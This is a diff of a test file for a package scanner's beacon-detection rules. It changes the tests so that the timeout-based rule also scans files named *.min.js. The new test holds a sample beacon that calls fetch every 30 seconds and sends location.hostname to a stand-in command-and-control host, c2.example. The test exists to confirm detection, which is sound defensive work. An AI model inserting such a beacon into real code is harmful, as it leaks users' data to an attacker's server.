@@ -59,20 +59,18 @@ describe("beacon rules require a transport call, not an identifier prefix", () =
     expect(lines(rule, content)).toEqual({ matcher: [1], regex: [1] });
   });
 
-  it("gives both beacon rules one shared notFilePattern constant", () => {
+  it("keeps the interval twin's file exclusion, as on main", () => {
     const shared = (patterns as Record<string, unknown>).BEACON_NOT_FILE_PATTERN;
     expect(shared).toBeInstanceOf(RegExp);
     expect(shippedRule("BEACON_INTERVAL_FETCH").notFilePattern).toBe(shared);
-    expect(shippedRule("BEACON_TIMEOUT_FETCH").notFilePattern).toBe(shared);
   });
 
-  it("skips minified vendored files for the timeout variant as for its twin", () => {
-    const content = "setTimeout(function(){fetch(u)},0)";
-    for (const rule of ["BEACON_INTERVAL_FETCH", "BEACON_TIMEOUT_FETCH"]) {
-      expect(isPatternApplicableToFile(shippedRule(rule), content, "vendor/ui.min.js"), rule)
-        .toBe(false);
-      expect(isPatternApplicableToFile(shippedRule(rule), content, "src/poll.js"), rule)
-        .toBe(true);
-    }
+  // The scanned package names its own files: a name must not hide a beacon.
+  it("scans a file named *.min.js for the timeout variant", () => {
+    const content = 'setTimeout(()=>fetch("https://c2.example/b?h="+location.hostname),3e4)';
+    const rule = shippedRule("BEACON_TIMEOUT_FETCH");
+    expect(rule.notFilePattern).toBeUndefined();
+    expect(isPatternApplicableToFile(rule, content, "lib/beacon.min.js")).toBe(true);
+    expect(lines("BEACON_TIMEOUT_FETCH", content)).toEqual({ matcher: [1], regex: [1] });
   });
 });
